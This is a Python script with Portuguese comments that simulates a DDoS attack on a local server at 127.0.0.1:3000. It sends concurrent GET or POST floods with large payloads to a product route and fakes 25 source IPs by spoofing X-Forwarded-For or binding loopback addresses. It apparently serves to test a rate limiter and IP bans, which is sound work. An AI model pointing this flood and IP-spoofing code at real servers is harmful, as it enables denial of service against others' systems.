# simulador de ataque DDos dispara varis requisições simultaneas ao servidor
# simulando N cliente (usando IPs falsos) enviando M requisições cada

import asyncio
import time
import httpx
import platform
import random

# detecta se está rodando no windows
IS_WINDOWS = platform.system() == "Windows"

# configurações do ataque
HOST_ALVO = "127.0.0.1" # mudado de "localhost para "127.0.0.1" para forçar o uso de ipv4
PORTA_ALVO = 3000
URL_BASE = f"http://{HOST_ALVO}:{PORTA_ALVO}"

NUM_CLIENTES = 25               # quantidade de ips simulados
REQUISICOES_POR_CLIENTE = 40    # quantidade de requisições por ip
TIPO_ATAQUE = "post_flood"

PAYLOAD_POST = {
    "origem": "botnet_simulada",
    "dados": "Olá!" * 2500  # envia 10000 caracteres
}

def gerar_ip_simulado(client_index: int) -> str:
    return f"127.0.0.{client_index + 2}"


# seção ataque GET FLOOD

# dispara apenas uma requisição HTTP simulando o ip de origem via o header X-Forwarded-For
# e o cliente pega o header e le como o "IP do cliente", 
# para simular diversos ips diferentes de forma fácil (TALVEZ USAR OUTRO MÉTODO PARA MULTIPLOS IPS)
async def mandar_requisicao_get(cliente: httpx.AsyncClient, ip_origem: str) -> dict:
    headers = {"X-Forwarded-For": ip_origem} if IS_WINDOWS else {}
    # aponta pra rota pesada, com id aleatório, pra gerar custo real de processamento no servidor
    url = f"{URL_BASE}/produto/{random.randint(1, 1000)}"

    # requisição limpa, que o servidor descobre o ip pelo pacote TCP
    try:    
        response = await cliente.get(url, headers=headers)
        return {"ip": ip_origem, "status": response.status_code}

    except Exception as err:
        return {"ip": ip_origem, "status": "erro", "error": str(err)}

# simula um cliente disparando vária requisições me sequencia rápida. amarrado ao seu próprio ip de origem
async def simular_cliente_get(cliente_index: int) -> list:
    ip_origem = gerar_ip_simulado(cliente_index)
    resultados_list =[]

    if IS_WINDOWS:
        # modo windows: cria o cliente HTTP normal, sem forçar placa de rede
        async with httpx.AsyncClient() as cliente:
            for _ in range(REQUISICOES_POR_CLIENTE):
                resultado = await mandar_requisicao_get(cliente, ip_origem)
                resultados_list.append(resultado)
    else:
        # modo linux/mac: "local_address" força a saída do tráfego pelo IP real específico
        transport = httpx.AsyncHTTPTransport(local_address=ip_origem)
        async with httpx.AsyncClient(transport=transport) as cliente:
            for _ in range(REQUISICOES_POR_CLIENTE):
                resultado = await mandar_requisicao_get(cliente, ip_origem)
                resultados_list.append(resultado)

    return resultados_list


# seção ataque POST FLOOD

async def mandar_requisicao_post(cliente: httpx.AsyncClient, ip_origem: str) -> dict:
    headers = {"X-Forwarded-For": ip_origem} if IS_WINDOWS else {}
    # mesma lógica do GET: aponta pra rota pesada, agora via POST (simula "atualização de produto")
    url = f"{URL_BASE}/produto/{random.randint(1, 1000)}"

    try:    
        # Envia a requisição POST acompanhada do payload JSON
        response = await cliente.post(url, json=PAYLOAD_POST, headers=headers)
        return {"ip": ip_origem, "status": response.status_code}

    except Exception as err:
        return {"ip": ip_origem, "status": "erro", "error": str(err)}

async def simular_cliente_post(cliente_index: int) -> list:
    ip_origem = gerar_ip_simulado(cliente_index)
    resultados_list = []

    if IS_WINDOWS:
        async with httpx.AsyncClient() as cliente:
            for _ in range(REQUISICOES_POR_CLIENTE):
                resultado = await mandar_requisicao_post(cliente, ip_origem)
                resultados_list.append(resultado)
    else:
        transport = httpx.AsyncHTTPTransport(local_address=ip_origem)
        async with httpx.AsyncClient(transport=transport) as cliente:
            for _ in range(REQUISICOES_POR_CLIENTE):
                resultado = await mandar_requisicao_post(cliente, ip_origem)
                resultados_list.append(resultado)

    return resultados_list

# execução do ataque
async def rodar_ataque():
    print(f"Iniciando ataque simulado: {NUM_CLIENTES} clientes x {REQUISICOES_POR_CLIENTE} requisições cada")
    print(f"Alvo: {URL_BASE}/produto/{{id}}\n")

    hora_inicio = time.time()

    # cria as tarefas, a função simular_cliente_get cria o cliente específico de cada IP
    # seleciona qual tipo de ataque vai simular
    if TIPO_ATAQUE.lower() == "post_flood":
        tasks = [simular_cliente_post(i) for i in range(NUM_CLIENTES)]
    else:
        tasks = [simular_cliente_get(i) for i in range(NUM_CLIENTES)]

    todos_resultados = await asyncio.gather(*tasks)

    # comprime a lista de listas em uma única lista
    flat_results = [resultado for resultados_cliente in todos_resultados for resultado in resultados_cliente]

    segundos_passado = round(time.time() - hora_inicio, 2)

    # resumo por código de status
    sumario = {}
    for r in flat_results:
        status = r["status"]
        sumario[status] = sumario.get(status, 0) + 1

    print(f"Ataque do tipo {TIPO_ATAQUE} concluído em {segundos_passado}s")
    print(f"Total de requisições enviadas: {len(flat_results)}")
    print("Resumo por status:", sumario)
    print("  200 = aceita | 429 = bloqueada pelo rate limiter | 403 = IP já banido")


if __name__ == "__main__":
    asyncio.run(rodar_ataque())